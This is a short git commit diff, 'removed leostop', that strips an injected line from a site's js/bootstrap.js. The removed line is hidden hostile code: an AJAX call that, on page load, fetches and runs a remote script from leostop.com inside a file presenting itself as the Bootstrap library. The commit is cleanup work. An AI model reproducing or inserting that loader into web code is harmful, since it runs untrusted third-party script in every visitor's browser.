6676f875b982808518fdf21508aa1fbdfa5c187b
Miguel Rodríguez Herrero <rodriguezherreromiguel@gmail.com>
2023-06-17 21:29:58 +0200

    removed leostop

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -225,7 +225,7 @@
   setTransitionEndSupport();
 
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  function getURL() { window.location.href; } var protocol = location.protocol; 
 
 
 
